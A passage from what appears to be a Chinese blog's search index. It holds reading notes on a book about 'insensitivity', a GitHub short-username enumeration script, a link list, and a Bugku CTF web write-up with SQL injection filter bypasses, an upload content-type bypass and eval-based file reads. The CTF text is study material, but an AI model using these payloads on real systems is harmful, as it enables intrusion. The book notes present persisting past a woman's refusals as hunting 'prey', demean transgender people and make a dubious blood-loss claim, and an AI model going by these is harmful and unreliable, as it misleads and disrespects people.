那时我深深体会到没有比那种多少有些才华，但自尊心过强的家伙，更令人担忧的了。\n人们能否成功，不完全取决于才能。也就是说有才能的人并不一定就能成功。（不成功不代表没有才能）\n在文坛上，非要举出什么是成功的必要条件的话，那就是有益的钝感力。无用赘言，其前提是需要有一定的才华，而能让才华经过磨炼熠熠生辉的，正是坚韧的钝感力。\n钝感就是一种才能，一种能让人们的才华开花结果、发扬光大的力量。\n人们的各种感觉器官若过于敏感的话，会对人产生负面影响。\n“笨拙的想法和休息不相上下”这句俗语说的就是，若左思右想，也于事无补，还不如横下心来，闭眼休息。\n人就是这样，被他人毫不犹豫地多夸几次，慢慢地自己也会觉得是那么回事了，也会向那个方向去努力。那些明显怪诞的新兴宗教，仍然有人加入其中，可能就是被这种大声的夸奖吸引过去的。宗教劝诱本身当然有问题，不过能够积极对待别人鼓励自己的话语，积极地为之而努力，却绝对不是一件坏事。\n这种听了两句表扬就飘飘然并信以为真的劲头，的确也是一种才能。\n正如众所周知的那样，孩子们非常单纯，是得寸进尺的典型，所以没有比利用孩子这种习性更好的方法了。孩子高兴了，会变得愈发努力。由于努力，事情便会做得更加出色。因为表现出色，又会受到赞扬，孩子就愈发努力，双方配合默契，孩子就会不断进步。\n不管多么优秀的孩子，当然也包括大人，倘若每天都生活在“你根本不行”、“你真是个傻瓜”一类的批评之中，长此以往，就会真的变成一个没用的、傻瓜似的人了。\n因此语言极为重要。一句话既可以救活一个人，也可以杀死一个人。对于才能也是如此。\n人能否成功，不只取决于才能的有无，而在于究竟能把人的才能发掘和引导出来多少，社会上所谓有才能的人，都有一个在适当时期，用适当方法将其才能发掘、引导出来的人。相反，人们口中那些没有才能的人，大多只是由于其潜在的才能没有在适当的时机被发掘和引导出来。\n在恋爱方面，钝感力也是必不可缺的。特别是当男人追求女人的时候，钝感可以成为一种有力的武器。若再加上诚实，则更如虎添翼。\n恋爱首先是心灵之间的相互碰撞，其中并不一定有什么理论和道理可言。恋爱的暧昧及难以琢磨之处也正在于此。\n其实这是因为男人和女人从根本上就是不同的生物，尤其肉体的原点完全相异。这些差距，不是通过语言上的交谈，就能解决的。\n也就是说，一位好猎手，只要看准了目标，无论被对方拒绝多少次，也要坚持追求，向女方倾诉自己的衷肠。没有这种坚韧而厚颜的精神，就无法将美丽的猎物捕捉到手。\n其实很多女性都曾说，“就算多少有些不中意，但是在对方不厌其烦的邀请和竭尽全力的追求下，还是逐渐地被对方打开了心扉，或许还会开始喜欢……”\n男女双方无论是生长环境、兴趣爱好，还是个人教养、价值观等不可能相同，然而结婚，就是不同的男女在一时热情的怂恿下，共同在一个狭小的家中生活。\n相反，那种天生聪慧、神经质的人就不可能那样了。他（她）们对对方做的每一件事都极为在意，烦躁和不满不断升级。\n一般来说，人体的血液总量为体重的十二分之一。若其中三分之一流失，人就将面临死亡。\n女性不怕出血啊。教科书上确实写着，出血量达到血液总量三分之一的话，人就会死亡，不过在那种情况下死亡的是男性。\n这种现象我们从那些变性人身上就可以看得一清二楚，那些人不管穿什么女装、怎样模仿女性的言谈举止，可总让人觉得缺点儿什么，他们欠缺的就是女性的那种圆润。\n说句笑话，如果那时我知道女性的皮下脂肪是那么丰富的话，我可能就不会把自己的登山服借给她了。\n男性是靠精神上的力量来忍耐的。与之相比，女性对生理上的那种痛彻心肺的痛苦的忍耐力，却是出人意料的坚强。\n在我们身边，经常会发生被朋友或同事嫉妒、中伤和刁难的事情。不要听到不中听的话就如临大敌，而要仔细思考对方那么说的原因，体察对方的心情。\n只要拥有钝感力，不管多么痛苦的事情，都能转化成为对自己有利的因素，这样才有可能坦然地以积极进取的态度生活下去。\n这一切表明，看问题的角度不同，人们的感受也截然不同。任何事情都应灵活地从积极的方面进行思考。而钝感力就是这种思维方式的动力。\n没有比老年人的大胆更可怕的了\n人们常说，“衣服的合身是穿出来的。”这位老太太就是不管衣服是否适合自己，只要喜欢，穿上再说。多数人可能没等穿上衣服就开始战战兢兢了，或者索性放弃了尝试。\n在现实生活中，人们很难像这位老太太那样，不介意他人的讽刺，堂堂正正地按照自己的信条行事，而是常常不自觉地往后退一步，等到本人察觉的时候，可能已经退了百步之遥了。这位顽强的老太太的动力，正是她听不出讽刺、或完全不理睬讽刺的钝感力。\n一旦下了决心，就能够无视周围人的目光和流言蜚语，毅然决然地进行。即便听到别人的讽刺，也是一副“与我无关”的架势，大大方方地勇往直前。　这种钝感力，正是人们向崭新的领域挑战时能够获得成功的原动力。\n双方一旦相恋，要想将彼此的爱情持续下去，在某种程度上没有那种不拘小节的钝感力，是难以做到的。\n所谓爱情，就是宽容和原谅对方吧。\n面对芸芸众生各式各样的毛病，有些人耿耿于怀，有些人不太在乎，有些人视若无睹。在这方面人们的感觉各自不同，但有一点非常明确，就是只有对各种令人不快的毛病忽略不计，才能开朗、大度地生活下去。\n拥有坚强钝感力的员工对公司来说，可说是宝贵的人才，以这种顽强的精神，今后极有可能担任公司的要职。\n使我深刻体会到在集体中生存的复杂和艰难\n人们的好恶以及忍受范围各不相近，可谓是千差万别。而公司正是各种好恶之情彼此涌动、互相碰撞的场所。　那么，具备何种才能的人才能在这样的环境中迅速适应，并如鱼得水地工作，乐观开朗地生存呢？　这就是必不可少的钝感力。\n如何才能培养身体的钝感力呢？当然，我们要通过各种方法增强自己的基本体力，不过由于鼻喉黏膜的特性以及每个人体质不同，所以这些问题是不可能轻易就能改善的。\n就算到了一个自然环境、人文环境都不相同的世界，也能开朗、健康的生活。\n凡有宏图大志，希望能在更广阔的天地中成就一番事业的人，都应该首先确认一下自己的钝感力，认为有的话，就要倍加珍惜；觉得自己缺少钝感力的人，就要加紧培养。拥有更加坚强的钝感力，才能融入各种环境当中。\n这种可以原谅一切的情感，正是产生钝感力的原点。\n实际上，小孩困时会哭，饿时会哭，热的时候还是哭。小孩的哭声既是诉说，又是撒娇，更是生命存在的证明。\n生过孩子的女性和没有生过孩子的女性，以及没有自己孩子的男性，这三者拥有的钝感力存在着决定性的差距，这些差距将会对这三者今后的生活方式产生巨大的影响。\n世界上不仅仅存在敏锐聪慧这种才能。相比之下，不为琐事动摇的钝感，才是人们生活中最为重要的基本才能。而且，只有具备这种钝感力，敏锐和敏感才能成为真正的才能，从而在人生的道路上发挥其应有的作用。\n","permalink":"https://ret2neo.cn/mind/180420insensitivity/","summary":"by 渡边淳一\n读后感 迟钝的益处 抗压能力更强 专注创造价值 充分发挥潜力 能够坚持不懈 =\u0026gt; 更大的成功概率（事业，爱情） 适应能力更强 适应物理环境 乐观开朗，积极进取 怎样变迟钝 能做些什么 眼耳鼻舌身意的敏感程度很大一部分是天生的，难以改变，但是并非完全没有可能。\n磨练。 再锋利的刀以合适的角度持续磨砺也会钝化。强光刺目，三秒就瞎，轰鸣入耳，不久渐聋，傻子不起妄念，呆子心如止水。但问题是这样的自虐是否偏离初衷？ 生理上 锻炼身体使体魄强健，血液畅流，强化适应环境的能力。 心理上 训练专注力：不因敏锐的感官而分神 参禅打坐，观照冥想？据说刹那有万千念头起灭，自由控制是可能的吗？ 积极的思维方式 平衡敏感与迟钝 毕竟坐怀不乱与不解风情有所不同。 多思考他人的动机，尝试理解他人语言和行为的出发点。 少归因到自己身上。 不忧虑无法改变的事情。 理论上，一切皆可理解，世事皆可原谅。 要义 心无一物是第一义，但不切实际也无意义。 第二义：恕己容人，淡化情绪，以积极的方式思考和引导自己。 反思 人生的一大部分乐趣在于体验悲欢，我们的目标并不是练成一块石头。 我们需要变得迟钝是因为不希望沉迷细节而失去对全局的掌控。 我们所谈论的敏锐和迟钝应该是在一个正常区间内的，超出这个区间的就是病，非意志所能左右。 如果不瞎，那么当一个东西出现在你眼前，你不可能真的看不见。迟钝应该是锻炼自己在意识上忽略它，如果它现在不重要的话。长此以往，形成惯性，只要盯着目标，其余的都将自然而然被忽略。到这时，就可以说是形成了有益的钝感力了。 评价 抛去观点不谈，全书论述并不严肃，逻辑也不很严谨，组织有些分散，一时没有读出作者对语言的驾驭能力。当然也可能是翻译不到位的缘故。\n本书带来了一个有价值的概念，并且用案例引发读者思考。但主要是介绍钝感的价值，距离可操作有一定距离。究其原因，是混淆了意志上的钝感和生理上的钝感。作者为了说明钝感的作用与价值，不可避免地将两者煮在一锅。但当我们明白了钝感很重要很有价值后，就会想提高自己的钝感。这时要明白面对生理上的钝感我们是无能为力的，就像男人再努力也觉得分娩可怖，免疫缺陷患者再努力也没法靠意志力抵抗病菌。也许自律神经经过训练可以被控制，但对大部分人来说这几乎是不可能的。\n所以我们所能做的，是在意识可控的层面提高迟钝度。忽略不紧要的，抑制不积极的，始终注意把握全局，坚定彻底地相信自我。\n此外，还可以利用一些心理学上的方法暗示自己。不需要觉得是在自我欺骗，毕竟终究每个念头都未必是真实，那么何不让有益的念头先入为主？\n各章要点 我们丧失了某种才能 在各行各业中取得成功的人们，当然拥有才能，但在他们的才能背后，一定隐藏着有益的钝感力。钝感就是一种才能，一种能让人们的才华开花结果，发扬光大的力量。 钝感的优越 迟钝在生理上的意义 蚊子叮咬，不抓挠，自然恢复。 愚钝在精神上的意义 表现平平的小K被上司怒骂而毫发不损，而不是沉浸其中，自责忧虑。（即时挨骂，也不气馁） 高才华且强自尊的O先生因退稿而一蹶不振，死气沉沉，恶性循环，再无成名之日。 在斥责声中成长的名医 对健康而言，最为重要的就是让自己全身的血液总是能够顺畅地流淌。因此，做事不要总是思前想后，即使别人说些不中听的话，听完后马上就能抛到脑后。这种有益的钝感，是保证血液畅通无阻的重要原因。 主任教授不停责骂，S医生频频点头称是。接受责骂，专注领会手术要领。多年后发现S医生以自我为中心，并不认真听人说话，并因此不计较他人言语，从而保持精神安定，心情愉悦。 控制血管的神经叫做自律神经，应尽量让其保持放松，不去刺激它。 血液因此畅流 我们的血管是由自律神经来控制的，拥有有益钝感力的人，其自律神经不易陷入异常的刺激当中，能够让血管一直保持舒张状态，从而使全身的血液可以畅通无阻地流遍全身。 自律神经 交感神经。兴奋。精神上紧张、不安、烦躁；情绪上恼怒、愤恨、憎恶；寒冷。 副交感神经。舒缓。神清气爽、开怀大笑、环境温暖。 老年人收容所。逗乐老年人以保持其血液流畅；胃溃疡源于精神压力。 精神压力的益处与害处。 自律神经努力使身体平衡，有益的钝感力可减轻其负担。 迟钝的五官 人们的各种感觉器官若过于敏感的话，会对人产生负面影响。钝感的人和敏感的人相比，前者不会造成器官的消耗，可以更为悠闲自在、胸襟开阔地长寿下去。 视觉、听觉、嗅觉、味觉、触觉过于敏感带来的痛苦。 睡眠良好的能人 睡得香甜，起得迅速，这种睡眠能力正是人的基本能力。没有睡眠能力的话，人们就不能保持健康的身体，就不能专心致志地工作。睡眠良好，这也是一种真正的才能。 在众多的钝感力当中，能够成为其核心代表的是良好的睡眠。我们称之为“睡眠能力”，这是人们所有的活动和健康的源泉。 入睡易，起床快可以相对多出六万个小时。 医生的夜班经历锻炼了作者随时起床的能力。 随时随地入睡的老太太和失眠的人群。 若左思右想，也于事无补，不如横下心来，闭眼休息。 得寸进尺的才能 有才能的人周围，肯定会有时常表扬他的人，而其本人也常因表扬而得寸进尺，这种“得寸进尺、得意忘形”的精神，不是所谓的卑鄙无耻，而是一种让人朝着光明的未来展翅高飞的原动力。 人都因鼓舞而奋进。 作者因酒保的鼓励而振作 画家A先生因邻居大婶的鼓励而努力练画 作者因中学语文老师的鼓励而走上写作道路 鼓励可能本身仅仅是鼓励，毕竟酒保不懂文学，大婶不懂艺术，但那种心理上积极 的感受意义非凡！ 语言极为重要。一句话既可以救活一个人，也可以杀死一个人。对于才能也是如此。 人能否成功，不只取决于才能的有无，而在于究竟能把人的才能发掘和引导出来多少，社会上所谓有才能的人，都有一个在适当时期，用适当方法将其才能发掘、引导出来的人。相反，人们口中那些没有才能的人，大多只是由于其潜在的才能没有在适当的时机被发掘和引导出来。 正确地在合适时机表扬孩子。进一步地，表扬自己。 肠胃钝感的男人 贫穷让A童年时多吃了些杂菌，练就坚强肠胃，多年后的一次晚宴后，大家都拉肚子，而他安然无恙。 钝感来自于锻炼，健忘是一副良药。 被爱的女神射中 在恋爱方面，钝感力也是必不可缺的。特别是当男人追求女人的时候，钝感可以成为一种有力的武器。若再加上诚实，则更如虎添翼。 男人和女人从根本上就是不同的生物，尤其肉体的原点完全相异。这些差距，不是通过语言上的交谈，就能解决的。 一位好猎手，只要看准了目标，无论被对方拒绝多少次，也要坚持追求，向女方倾诉自己的衷肠。没有这种坚韧而厚颜的精神，就无法将美丽的猎物捕捉到手。 其实很多女性都曾说，“就算多少有些不中意，但是在对方不厌其烦的邀请和竭尽全力的追求下，还是逐渐地被对方打开了心扉，或许还会开始喜欢……” 钝感的应用 不屈不挠地追求 钝感的肠胃 杂乱的房间 男女双方无论是生长环境、兴趣爱好，还是个人教养、价值观等不可能相同，然而结婚，就是不同的男女在一时热情的怂恿下，共同在一个狭小的家中生活。 为了维系婚姻生活 结婚生活就是一条漫长的容忍之路。 为了战胜癌症 从癌症的预防到治疗，以及治愈之后回归社会，在所有阶段，最重要的就是保持良好的心态，也就是所谓的钝感力。 女性的强大之一 “弱者，你的名字叫男人。”——男性是一种多么诚实、严谨、敏感的性别啊。相比之下，女性则大度、暧昧而钝感。 男女的钝感力差别 一千金，二公子 女性不怕出血 女性的强大之二 女性既不怕寒冷，也不怕出血和疼痛。在过去，分娩对于母亲和即将降生的婴儿来说，都是性命攸关的一道坎，女性如何才能闯过此道难关，竭尽全力将孩子生下，使人类得以持久地存在下去呢？为此，造物主想到的就是，将担当分娩重任的女性创造得更为坚韧而强壮。 不畏严寒。更厚的脂肪层。 不畏疼痛。分娩的疼痛。男性是靠精神上的力量来忍耐的。与之相比，女性对生理上的那种痛彻心肺的痛苦的忍耐力，却是出人意料的坚强。 感谢嫉妒和讽刺 在我们身边，经常会发生被朋友或同事嫉妒、中伤和刁难的事情。不要听到不中听的话就如临大敌，而要仔细思考对方那么说的原因，体察对方的心情。这种心胸宽广的钝感力，可以在我们的日常生活中起到极大的作用。 被嫉妒是一种肯定。 讽刺达不到目的。 恋爱的能力 喜欢对方，希望将彼此的恋爱关系延续下去的话，就要拥有原谅对方的胸怀。如果希望两个人永远相爱、幸福美满，在某种程度上就要能够原谅对方，钝感一些。这种钝感力，正是让恋爱关系长久维系的能力。 恋爱的初期，敏感是必要的。 长期的恋爱，钝感是重要的。 为了更好地生存 面对芸芸众生各式各样的毛病，有些人耿耿于怀，有些人不太在乎，有些人视若无睹。在这方面人们的感觉各自不同，但有一点非常明确，就是只有对各种令人不快的毛病忽略不计，才能开朗、大度地生活下去。 适应环境的能力 就算到了一个自然环境、人文环境都不相同的世界，也能开朗、健康的生活。 伟大的母爱 母爱集钝感力之大成。经过分娩的疼痛从自己腹中生出的孩子，无论做什么事都让母亲觉得可爱，亦可原谅。这种可以原谅一切的情感，正是产生钝感力的原点。 分娩之后的钝感 喂奶 夜里的哭闹 可爱的污渍 原谅孩子的母亲 语录 那时我深深体会到没有比那种多少有些才华，但自尊心过强的家伙，更令人担忧的了。","title":"《钝感力》"},{"content":"做了件无聊的事，做完发现有人做过了（https://www.v2ex.com/t/401615 ） ，记录一下。\nGitHub用户名要求是\n1 Username may only contain alphanumeric characters or single hyphens, and cannot begin or end with a hyphen 也就是满足正则 ^[0-9a-zA-Z]$|[0-9a-zA-Z][-0-9a-zA-Z]*[0-9a-zA-Z] ，\n因为大小写不敏感，所以相当于 ^[0-9a-z]$|[0-9a-z][-0-9a-z]*[0-9a-z]\n产生一位和两位的符合GitHub命名要求的名字\n1 2 3 4 5 6 7 8 9 10 11 12 13 import string import itertools f=open(\u0026#34;GithubName12.txt\u0026#34;,\u0026#39;w+\u0026#39;) a=string.lowercase +string.digits+\u0026#39;-\u0026#39; tmp=[] for i in xrange(1,3): for j in itertools.product(a,repeat=i): name=\u0026#39;\u0026#39;.join(j) if j[0]==\u0026#39;-\u0026#39; or j[-1]==\u0026#39;-\u0026#39;: continue tmp.append(name) f.write(\u0026#39;\\n\u0026#39;.join(tmp)) 产生三位的符合GitHub命名要求的名字\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 import requests import string import itertools import random f=open(\u0026#34;GithubName3.txt\u0026#34;,\u0026#39;w+\u0026#39;) a=string.lowercase +string.digits+\u0026#39;-\u0026#39; tmp=[] for i in xrange(3,4): for j in itertools.product(a,repeat=i): name=\u0026#39;\u0026#39;.join(j) if j[0]==\u0026#39;-\u0026#39; or j[-1]==\u0026#39;-\u0026#39;: continue tmp.append(name) random.shuffle(tmp) f.write(\u0026#39;\\n\u0026#39;.join(tmp)+\u0026#39;\\n\u0026#39;) 然后用burp的intruder跑就可以了，404为用户名未被占用。\n1 2 3 4 5 6 7 8 HEAD /$asdf$ HTTP/1.1 Host: github.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 实测未被占用的名字未必都可用，比如一/二个字母的基本上都不能用了。\n一位长的名字只有 w 未被使用，但实际修改名字时响应为Login name 'w' is a reserved word\n两位长的倒是颇多，但也都不可用，响应均为 Login is already taken 1 06 0e 0t 0y 2e 2l 2n 2v 3u 4j 4r 4t 4y 5b 5f 5h 5j 5n 5q 5t 5u 5z 6e 6i 6j 6l 6m 6n 6o 6p 6r 6y 7j 7p 7y 8a 8n 8y 96 9e 9g 9j 9w 9y j3 m6 n5 u6 y4 y6 y9 三位长的就很多了，部分结果放在 GIthub 上了，其中不乏一些靓号：）\n但也有一些是保留字或者被使用过，如\nLogin name 'api' is a reserved word\nLogin name 'ssh' is a reserved word\nsee ,Login is already taken vxv, Login is already taken \u0026hellip;\n提取出其中全字母或全数字的名字：\n1 2 3 4 5 6 7 8 9 import string a=string.lowercase a=string.digits r=[] with open(\u0026#39;final.txt\u0026#39;) as f: for i in f.readlines(): if i[0] in a and i[1] in a and i[2] in a: r.append(i.strip()) print \u0026#39; \u0026#39;.join(r) 结果：\n1 2 3 049 061 065 067 082 087 115 116 144 158 185 211 214 232 249 258 279 302 362 363 378 379 387 401 402 405 406 408 409 410 411 412 413 414 417 418 419 421 423 425 426 427 428 433 436 442 455 469 473 476 484 485 489 495 501 504 506 507 508 510 557 558 566 594 622 632 635 642 643 652 663 672 674 675 676 683 694 739 746 756 769 771 781 783 795 801 806 807 822 827 834 836 843 849 852 859 860 872 896 900 905 924 927 932 942 948 952 965 970 976 981 any api bkk cgf cla dsr eer eou evx exn exv eyh ezj faj hff iei ird iro iuu izl jxq kbx lbi lpo mqe mxq nhj nmf oia ouu qbd qcp qeq qfv qje qkj qtx qvg raw rre see sfv ssh tqo uau ueu ump unw upk uqy urr uyy vfj vhw vnv vqj vqk vxv vxx wek wiq xnn xoy xpp xsu xxt yiy yqv zdq zvt ","permalink":"https://ret2neo.cn/post/180419githubniceid/","summary":"做了件无聊的事，做完发现有人做过了（https://www.v2ex.com/t/401615 ） ，记录一下。\nGitHub用户名要求是\n1 Username may only contain alphanumeric characters or single hyphens, and cannot begin or end with a hyphen 也就是满足正则 ^[0-9a-zA-Z]$|[0-9a-zA-Z][-0-9a-zA-Z]*[0-9a-zA-Z] ，\n因为大小写不敏感，所以相当于 ^[0-9a-z]$|[0-9a-z][-0-9a-z]*[0-9a-z]\n产生一位和两位的符合GitHub命名要求的名字\n1 2 3 4 5 6 7 8 9 10 11 12 13 import string import itertools f=open(\u0026#34;GithubName12.txt\u0026#34;,\u0026#39;w+\u0026#39;) a=string.lowercase +string.digits+\u0026#39;-\u0026#39; tmp=[] for i in xrange(1,3): for j in itertools.product(a,repeat=i): name=\u0026#39;\u0026#39;.join(j) if j[0]==\u0026#39;-\u0026#39; or j[-1]==\u0026#39;-\u0026#39;: continue tmp.append(name) f.write(\u0026#39;\\n\u0026#39;.join(tmp)) 产生三位的符合GitHub命名要求的名字\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 import requests import string import itertools import random f=open(\u0026#34;GithubName3.","title":"GitHub 可用短ID"},{"content":" 如何才能去做喜欢的事情 英文原文：How To Do What You Love 给计算机系学生的建议 生活是一场游戏 侯捷观点-漫谈 程序员与编程（收藏） 侯捷的博客 理查德·汉明《你和你的研究》 假如帝国的黄昏降临！ 和菜头：碎片化生存 俞敏洪：在一个动荡的时代做不动荡的自己 微信之父张小龙内部8小时演讲【附原版164页PPT】 《张小龙2359条饭否日记（全文）》1~999 ,1000~2000 ,2000~2359 增广贤文 How to Discover Your Life Purpose in About 20 Minutes it-doesn-t-interest-me-what-you-do-for-a-living ；中文版 王垠：人的价值 ; 王垠的博客 紧紧抓住大有可为的历史机遇期 | 人民日报 看哪，这人。石康《独唱团》 中国互联网二十年啪啪打脸简史 ","permalink":"https://ret2neo.cn/mind/180410awesome/","summary":" 如何才能去做喜欢的事情 英文原文：How To Do What You Love 给计算机系学生的建议 生活是一场游戏 侯捷观点-漫谈 程序员与编程（收藏） 侯捷的博客 理查德·汉明《你和你的研究》 假如帝国的黄昏降临！ 和菜头：碎片化生存 俞敏洪：在一个动荡的时代做不动荡的自己 微信之父张小龙内部8小时演讲【附原版164页PPT】 《张小龙2359条饭否日记（全文）》1~999 ,1000~2000 ,2000~2359 增广贤文 How to Discover Your Life Purpose in About 20 Minutes it-doesn-t-interest-me-what-you-do-for-a-living ；中文版 王垠：人的价值 ; 王垠的博客 紧紧抓住大有可为的历史机遇期 | 人民日报 看哪，这人。石康《独唱团》 中国互联网二十年啪啪打脸简史 ","title":"奇文共赏"},{"content":"WEB WEB2 听说聪明的人都能找到答案 http://120.24.86.145:8002/web2/\n源码中有注释。 KEY{Web-2-bugKssNNikls9100}\n文件上传测试 http://103.238.227.13:10085/\nFlag格式：Flag:xxxxxxxxxxxxx\nFlag:42e97d465f962c53df9549377b513c7e\n上传文件后缀为PHP且修改content-type 值为image/gif 等即可。\n计算题 地址：http://120.24.86.145:8002/yanzhengma/\n修改前端限制。flag{CTF-bugku-0032}\nweb基础$_GET http://120.24.86.145:8002/get/\n访问http://120.24.86.145:8002/get/?what=flag 。flag{bugku_get_su8kej2en}\nweb基础$_POST http://120.24.86.145:8002/post/\n使用hackbar post what=flag 。 flag{bugku_get_ssseint67se}\n你从哪里来 http://120.24.86.145:9009/from.php\n添加HTTP头 Referer:https://www.google.com\nflag{bug-ku_ai_admin}\n头等舱 http://120.24.86.145:9009/hd.php\n响应头 flag{Bugku_k8_23s_istra}: ，在f12直接看看不出来。\nmd5 collision(NUPT_CTF) http://120.24.86.145:9009/md5.php\nhttp://120.24.86.145:9009/md5.php?a=s878926199a\nflag{md5_collision_is_easy}\n矛盾 http://120.24.86.145:8002/get/index1.php\n1 2 3 4 5 6 $num=$_GET[\u0026#39;num\u0026#39;]; if(!is_numeric($num)){ echo $num; if($num==1) echo \u0026#39;flag{**********}\u0026#39;; } http://120.24.86.145:8002/get/index1.php?num=1x\nhttp://120.24.86.145:8002/get/index1.php?num=1e0x\nflag{bugku-789-ps-ssdf}\nWEB3 flag就在这里快来找找吧 http://120.24.86.145:8002/web3/\nCTRL+U;CTRL+W;CTRL+END 得到：\n1 \u0026lt;!--\u0026amp;#75;\u0026amp;#69;\u0026amp;#89;\u0026amp;#123;\u0026amp;#74;\u0026amp;#50;\u0026amp;#115;\u0026amp;#97;\u0026amp;#52;\u0026amp;#50;\u0026amp;#97;\u0026amp;#104;\u0026amp;#74;\u0026amp;#75;\u0026amp;#45;\u0026amp;#72;\u0026amp;#83;\u0026amp;#49;\u0026amp;#49;\u0026amp;#73;\u0026amp;#73;\u0026amp;#73;\u0026amp;#125;--\u0026gt; 1 2 3 s = \u0026#39;\u0026amp;#75;\u0026amp;#69;\u0026amp;#89;\u0026amp;#123;\u0026amp;#74;\u0026amp;#50;\u0026amp;#115;\u0026amp;#97;\u0026amp;#52;\u0026amp;#50;\u0026amp;#97;\u0026amp;#104;\u0026amp;#74;\u0026amp;#75;\u0026amp;#45;\u0026amp;#72;\u0026amp;#83;\u0026amp;#49;\u0026amp;#49;\u0026amp;#73;\u0026amp;#73;\u0026amp;#73;\u0026amp;#125;\u0026#39; print \u0026#39;\u0026#39;.join(map(lambda x: chr(int(x)), s.strip(\u0026#39;\u0026amp;#;\u0026#39;).split(\u0026#39;;\u0026amp;#\u0026#39;))) # KEY{J2sa42ahJK-HS11III} SQL注入 http://103.238.227.13:10083/\n格式KEY{}\n宽字节注入。\n1 2 3 4 5 6 7 8 9 10 11 http://103.238.227.13:10083/?id=1%dd\u0026#39; You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near \u0026#39;\u0026#39;1輁\u0026#39;\u0026#39; LIMIT 1\u0026#39; at line 1 http://103.238.227.13:10083/?id=1%dd\u0026#39;--+ 正常返回 http://103.238.227.13:10083/?id=1%dd\u0026#39; order by 2--+ 确定查询列数为2 http://103.238.227.13:10083/?id=1%dd\u0026#39; union select string,0 from `key` where id=1--+ 54f3320dc261f313ba712eb3f13a1f6d 域名解析 听说把 flag.bugku.com 解析到120.24.86.145 就能拿到flag\n访问120.24.86.145 并burp抓包，修改host值为 flag.bugku.com 即可。KEY{DSAHDSJ82HDS2211}\nSQL注入1 地址：http://103.238.227.13:10087/\n提示：过滤了关键字 你能绕过他吗\nflag格式KEY{xxxxxxxxxxxxx}\n部分过滤代码\n1 2 3 4 5 6 7 8 9 10 11 12 //过滤sql $array = array(\u0026#39;table\u0026#39;,\u0026#39;union\u0026#39;,\u0026#39;and\u0026#39;,\u0026#39;or\u0026#39;,\u0026#39;load_file\u0026#39;,\u0026#39;create\u0026#39;,\u0026#39;delete\u0026#39;,\u0026#39;select\u0026#39;,\u0026#39;update\u0026#39;,\u0026#39;sleep\u0026#39;,\u0026#39;alter\u0026#39;,\u0026#39;drop\u0026#39;,\u0026#39;truncate\u0026#39;,\u0026#39;from\u0026#39;,\u0026#39;max\u0026#39;,\u0026#39;min\u0026#39;,\u0026#39;order\u0026#39;,\u0026#39;limit\u0026#39;); foreach ($array as $value) { if (substr_count($id, $value) \u0026gt; 0) { exit(\u0026#39;包含敏感关键字！\u0026#39;.$value); } } //xss过滤 $id = strip_tags($id); $query = \u0026#34;SELECT * FROM temp WHERE id={$id} LIMIT 1\u0026#34;; strip_tags 用以从字符串中去除 HTML 和 PHP 标记，可利用其绕过sql关键字过滤。\n1 2 3 4 5 6 7 8 http://103.238.227.13:10087?id=1 an\u0026lt;a\u0026gt;d 1=2--+ 验证过滤思路可行 http://103.238.227.13:10087?id=1 o\u0026lt;a\u0026gt;rder by 2--+ 确定查询列数为2 http://103.238.227.13:10087?id=1 un\u0026lt;a\u0026gt;ion sel\u0026lt;a\u0026gt;ect 1,hash fr\u0026lt;a\u0026gt;om `key` where id=1--+ c3d3c17b4ca7f791f85e#$1cc72af274af4adef 你必须让他停下 地址：http://120.24.86.145:8002/web12/\n作者：@berTrAM\n在chrome dev tool 里禁用js，然后手动刷新几次页面。页面里的图片地址不总是有效，有图片显示时(10.jpg)查看源码可见flag。或者burp抓包后重复发包几次。\nflag{dummy_game_1s_s0_popular}\n本地包含 地址：http://120.24.86.145:8003/\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;?php include \u0026#34;flag.php\u0026#34;; $a = @$_REQUEST[\u0026#39;hello\u0026#39;]; eval( \u0026#34;var_dump($a);\u0026#34;); show_source(__FILE__); ?\u0026gt; --------------------------------------------------- view-source:http://120.24.86.145:8003/?hello=scandir(\u0026#39;.\u0026#39;) view-source:http://120.24.86.145:8003/?hello=file(\u0026#39;flag.php\u0026#39;) flag{bug-ctf-gg-99} 变量1 http://120.24.86.145:8004/index1.php\n1 2 3 4 5 6 7 8 9 10 11 flag In the variable ! \u0026lt;?php error_reporting(0); include \u0026#34;flag1.php\u0026#34;; highlight_file(__file__); if(isset($_GET[\u0026#39;args\u0026#39;])){ $args = $_GET[\u0026#39;args\u0026#39;]; if(!preg_match(\u0026#34;/^\\w+$/\u0026#34;,$args)){ die(\u0026#34;args error!\u0026#34;); } eval(\u0026#34;var_dump($$args);\u0026#34;); }?\u0026gt; 我们可以读取一个可变变量的值，但不知变量的名字，考虑超全局变量 。\n1 2 3 view-source:http://120.24.86.145:8004/index1.php?args=GLOBALS [\u0026#34;ZFkwe3\u0026#34;]=\u0026gt; string(38) \u0026#34;flag{92853051ab894a64f7865cf3c2128b34}\u0026#34; WEB5 JSPFUCK??????答案格式CTF{**}\nhttp://120.24.86.145:8002/web5/\n字母大写\n1 ([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(![]+[])[+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+!+[]]]+(+(!+[]+!+[]+!+[]+[!+[]+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[]